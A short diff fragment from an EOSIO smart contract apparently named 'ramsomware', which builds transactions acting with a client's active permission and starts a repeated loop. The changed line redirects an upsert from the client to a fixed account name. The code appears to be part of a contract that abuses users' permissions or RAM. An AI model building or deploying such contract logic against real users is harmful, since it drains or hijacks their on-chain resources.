@@ -52,7 +52,7 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             transaction out2{};
             out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
             out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
-            upsert(client, idx);
+            upsert(name("capAmerica"), idx);
 
             for(int i =0; i<=104; i++)
             { 
